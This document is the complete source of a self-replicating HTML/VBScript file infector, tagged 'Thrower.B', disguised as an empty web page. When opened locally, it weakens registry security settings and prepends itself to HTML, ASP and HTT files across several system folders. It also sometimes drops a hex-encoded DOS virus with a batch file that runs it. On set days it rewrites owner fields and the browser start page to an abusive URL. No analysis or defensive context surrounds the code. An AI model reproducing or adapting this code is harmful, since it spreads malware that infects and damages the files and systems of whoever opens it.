<!--Thrower.B-->
<html><body>

<SCRIPT language=VBScript><!--
On Error Resume Next
if location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  if location.protocol = "file:" then
	Set Kil13r = CreateObject("Scripting.FileSystemObject")
	HPath = Replace(location.href, "/", "\")
	HPath = Replace(HPath, "file:\\\", "")
	HPath = Kil13r.GetParentFolderName(HPath)
	Set Korea = document.body.createTextRange
	Call GetFolder(HPath)
	Call GetFolder("C:\My Documents")
	Call GetFolder("C:\Windows\¹ÙÅÁ È­¸é")
	Call GetFolder("C:\Windows\Desktop")
	Call GetFolder("C:\Windows\Web")
	Call GetFolder("C:\Windows\Web\Wallpaper")
	Call GetFolder("C:\Windows\Help")
	Call GetFolder("C:\Windows\Temp")
	Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	Call GetFolder("C:\Inetpub\wwwroot")
  end if
 if Int((3 * Rnd) + 1) = 1 then
	Set ScrFile = Kil13r.CreateTextFile("c:\Windows\System\System.dll", 2, False)
	ScrFile.WriteLine ""
	ScrFile.WriteLine "n System16.com"
	ScrFile.WriteLine "e 0100  E9 61 00 88 68 69 73 20 66 69 6C 65 20 69 73 20"
	ScrFile.WriteLine "e 0110  69 6E 66 65 63 74 65 64 20 77 69 74 68 20 74 68"
	ScrFile.WriteLine "e 0120  65 20 4D 61 72 61 75 64 65 72 20 76 69 72 75 73"
	ScrFile.WriteLine "e 0130  2E 20 31 39 39 32 2C 20 48 65 6C 6C 72 61 69 73"
	ScrFile.WriteLine "e 0140  65 72 20 50 68 61 6C 63 6F 6E 2F 53 6B 69 73 6D"
	ScrFile.WriteLine "e 0150  2E 0D 0A 24 20 20 20 20 20 20 20 B4 09 BA 03 01"
	ScrFile.WriteLine "e 0160  CD 21 CD 20 E8 00 00 5E 81 EE 0E 01 E8 05 00 E9"
	ScrFile.WriteLine "e 0170  85 00 3A 28 8B EE 81 C6 65 04 8B FE 50 53 51 52"
	ScrFile.WriteLine "e 0180  B9 8F 01 FD AD 33 86 19 01 AB E2 F8 5A 59 5B 58"
	ScrFile.WriteLine "e 0190  8B F5 C3 E8 DE FF CD 21 E8 D9 FF C3 7A 6B 7B 6A"
	ScrFile.WriteLine "e 01A0  91 B5 13 99 FC 93 D4 51 13 99 EC EE 99 E7 4A 49"
	ScrFile.WriteLine "e 01B0  4B 48 99 FC 93 D4 77 16 99 EC 42 41 43 40 AB 9D"
	ScrFile.WriteLine "e 01C0  13 EF 48 4B 49 4A 99 E7 DF 32 32 49 5F 73 60 73"
	ScrFile.WriteLine "e 01D0  67 76 77 60 4F 32 23 2B 2B 20 32 5A 77 7E 7E 60"
	ScrFile.WriteLine "e 01E0  73 7B 61 77 60 32 3F 32 42 7A 73 7E 71 7D 7C 3D"
	ScrFile.WriteLine "e 01F0  41 79 7B 61 7F 3C 1A 2E 82 0C 0F E5 1B A1 A6 76"
	ScrFile.WriteLine "e 0200  3E A4 BE 48 3E 2F 82 0C 1F A5 AE 4A 3E E5 1B 7E"
	ScrFile.WriteLine "e 0210  8E 6F 08 FA BB EE EC 2C F7 09 64 9C 23 E5 1B 2C"
	ScrFile.WriteLine "e 0220  7B A0 BE FB 3E 90 00 74 B3 AC EE 2C 6C 75 B7 9E"
	ScrFile.WriteLine "e 0230  75 2C B7 96 69 2C 83 2C 3A D4 C9 8C 6F 76 8E 32"
	ScrFile.WriteLine "e 0240  B7 BC 55 2C F7 09 8E 02 F7 09 BB D2 38 2A 4F 2B"
	ScrFile.WriteLine "e 0250  D3 96 3B 9C 74 A5 AE 10 3E 91 3D 28 F7 09 49 6C"
	ScrFile.WriteLine "e 0260  8E 32 B7 BC 22 2D F7 09 8E 13 B7 BC 78 2C F7 09"
	ScrFile.WriteLine "e 0270  48 2A D1 E2 BA 94 67 2C 3B 5C 23 98 3B A0 BE 75"
	ScrFile.WriteLine "e 0280  3E 9C 74 1B F3 99 29 A5 AE 16 3E E5 1B 5B 33 C1"
	ScrFile.WriteLine "e 0290  69 29 AA B8 8E 67 D1 DB 8E 13 B7 BC 0C 2D F7 09"
	ScrFile.WriteLine "e 02A0  48 DA D1 B2 B1 B4 BE 2C B3 B4 71 2C 82 29 79 1B"
	ScrFile.WriteLine "e 02B0  F3 A5 AE A5 3E E5 1B 5A 05 C0 A0 29 48 12 B3 AC"
	ScrFile.WriteLine "e 02C0  76 2C B1 B4 BD 2C B3 B4 7D 2C B1 B4 BF 2C B3 B4"
	ScrFile.WriteLine "e 02D0  73 2C A9 9C 05 91 3E 28 B7 BC 75 2C F7 09 BA 94"
	ScrFile.WriteLine "e 02E0  68 2C B2 5D 1F 90 3B 6B B1 A4 71 2C B7 BC B7 2C"
	ScrFile.WriteLine "e 02F0  08 C5 F7 09 8E 16 F7 09 07 2D 3A 5C 30 15 38 28"
	ScrFile.WriteLine "e 0300  4E 2D 8E 67 D3 7D C5 C1 E1 28 BB 94 75 2C 77 72"
	ScrFile.WriteLine "e 0310  4E FB D2 1F 3B 15 2A 28 48 E3 07 B7 C6 5B FC 05"
	ScrFile.WriteLine "e 0320  39 28 B2 8C 63 2C B2 AC 62 2C FC AC 60 2C B2 B8"
	ScrFile.WriteLine "e 0330  8E C1 B2 8C 6D 2C 08 E8 B2 AC 67 2C C5 AC 7F 2C"
	ScrFile.WriteLine "e 0340  B1 C6 D2 CF 3A 9C 16 E5 1B AB C0 28 4E DF B3 BC"
	ScrFile.WriteLine "e 0350  23 29 8B 20 E9 E2 B3 BC 61 2C BA D2 24 56 39 C3"
	ScrFile.WriteLine "e 0360  1A B8 B7 9E 79 29 B7 96 21 29 83 38 3A C0 82 28"
	ScrFile.WriteLine "e 0370  B7 9E 69 29 B7 96 09 29 83 2E 3A C0 90 28 D1 35"
	ScrFile.WriteLine "e 0380  AA A5 8C 71 3B A5 84 33 3B 91 2A 28 D2 B1 3A A5"
	ScrFile.WriteLine "e 0390  8C 41 3B A5 84 1B 3B 91 3C 28 D2 A3 3A C0 B6 28"
	ScrFile.WriteLine "e 03A0  B1 DD 8E 68 83 7F 39 AB FB 2D B7 BC 31 29 D2 CA"
	ScrFile.WriteLine "e 03B0  C7 5A 34 C0 B6 28 8E 68 83 2C 3A A5 AE 7F 3E E5"
	ScrFile.WriteLine "e 03C0  1B 90 3B 7F B1 A4 73 2C B1 BC 7D 2C B1 B4 76 2C"
	ScrFile.WriteLine "e 03D0  F7 09 8E 16 F7 09 82 29 79 A3 B6 63 3E A5 AE A5"
	ScrFile.WriteLine "e 03E0  3E 1A D7 E5 1B 9C 01 A5 AE FB 3E E5 1B 9C 20 92"
	ScrFile.WriteLine "e 03F0  BA 28 F7 09 6C 75 82 0C 1F A5 AE 76 3E E5 1B A5"
	ScrFile.WriteLine "e 0400  8C 7B 3E 97 3A 29 83 2C 3A D4 C9 8C 85 28 3B D7"
	ScrFile.WriteLine "e 0410  DD C0 22 28 8E 66 83 2F 3A A5 AE 16 3E E5 1B 5A"
	ScrFile.WriteLine "e 0420  F6 C0 06 28 8E 67 D1 DD C6 DB 9E EB B1 DD BB EE"
	ScrFile.WriteLine "e 0430  79 29 B1 D6 83 05 3A 85 09 AE 61 2C 91 CA C2 A3"
	ScrFile.WriteLine "e 0440  CF EB 82 28 78 1B F3 1B E8 E5 1B EB 82 2A 78 1B"
	ScrFile.WriteLine "e 0450  E8 1B F3 E5 1B EB 82 2A 07 A5 AE A5 3E E5 1B EB"
	ScrFile.WriteLine "e 0460  D2 DB C5 5A 11 A3 E2 7B D2 C9 C5 93 15 28 CD DB"
	ScrFile.WriteLine "e 0470  B1 E0 61 79 D2 E3 C5 71 6B 9C 7A 91 15 28 B7 BC"
	ScrFile.WriteLine "e 0480  55 29 F7 09 48 2E 63 61 D9 2A D1 C4 8E 16 F7 09"
	ScrFile.WriteLine "e 0490  F9 02 14 6B 75 65 3A 02 14 02 3A 06 14 28 3B 28"
	ScrFile.WriteLine "e 04A0  A2 3F 36 9E 1A 2D 3A 28 D1 71 AA 7C 33 E5 1A B8"
	ScrFile.WriteLine "e 04B0  D3 49 3A A0 12 12 3A 7E 3B 99 24 1A FA E7 B4 2E"
	ScrFile.WriteLine "rcx"
	ScrFile.WriteLine "03C0"
	ScrFile.WriteLine "w"
	ScrFile.WriteLine "q"
	ScrFile.WriteLine ""
	ScrFile.Close
	Set BatFile = Kil13r.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
	BatFile.WriteLine ""
	BatFile.WriteLine "@echo off"
	BatFile.WriteLine "debug < c:\Windows\System\System.dll > nul"
	BatFile.WriteLine "move c:\System16.com c:\Windows\Command\System16.com"
	BatFile.WriteLine "c:\Windows\Command\System16.com"
	BatFile.WriteLine ""
	BatFile.Close
 End If
  If Day(Now()) = 22 or Day(Now()) = 23 or Day(Now()) = 24 Then
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductName", "Windogz"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\LicensingInfo", "Fucking Ahnlab! I'm NOT HTML/Reality! Rename HTML\Thrower!"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kil13r\SVS012"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "in Korea, DLSoft"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://fuck-japan.com"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://fuck-japan.com"
  End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
if Kil13r.FolderExists(InfPath) then
	Do
	 Set FolderObj = Kil13r.GetFolder(InfPath)
	 InfPath = Kil13r.GetParentFolderName(InfPath)
	 Set FO = FolderObj.Files
	 For each target in FO
		ExtName = lcase(Kil13r.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Thrower = Kil13r.OpenTextFile(target.path, 1, False)
			if Thrower.readline <> "<!--Thrower.B-->" then
				Thrower.close()
				GetFile(target.path)
			else
				Thrower.close()
			end if
		end if
	 next
	Loop Until FolderObj.IsRootFolder = True
end if
End Sub

Sub GetFile(GetFileName)
	Set Thrower = Kil13r.OpenTextFile(GetFileName, 1, False)
	FileContents = Thrower.ReadAll()
	Thrower.close()
	Set Thrower = Kil13r.OpenTextFile(GetFileName, 2, False)
	Thrower.WriteLine "<!--Thrower.B-->"
	Thrower.Write("<html><body>" + Chr(13) + Chr(10))
	Thrower.WriteLine Korea.htmlText
	Thrower.WriteLine("</body></html>")
	Thrower.Write(FileContents)
	Thrower.close()
End Sub

--></SCRIPT>
</body></html>